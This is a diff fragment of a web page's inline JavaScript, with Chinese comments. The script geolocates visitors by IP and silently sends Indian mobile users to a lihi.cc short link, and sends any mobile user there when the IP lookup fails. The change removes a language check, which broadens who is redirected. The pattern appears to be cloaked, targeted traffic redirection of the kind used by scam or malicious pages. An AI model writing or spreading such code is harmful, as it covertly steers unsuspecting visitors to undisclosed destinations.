@@ -487,7 +487,7 @@
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'IN' && isMobileDevice() && isEnglishOrHindi()) {
+        if (data.country === 'IN' && isMobileDevice() ) {
           window.location.href = "https://lihi.cc/8RjFb";
           return;
         }
@@ -496,7 +496,7 @@
       })
       .catch(() => {
         // IP检测失败时严格的双重条件判断
-        if (isMobileDevice() && isEnglishOrHindi()) {
+        if (isMobileDevice() ) {
           window.location.href = "https://lihi.cc/8RjFb";
           return;
         }
@@ -505,6 +505,7 @@
   }
 </script>
 </html>
+
 
 
 
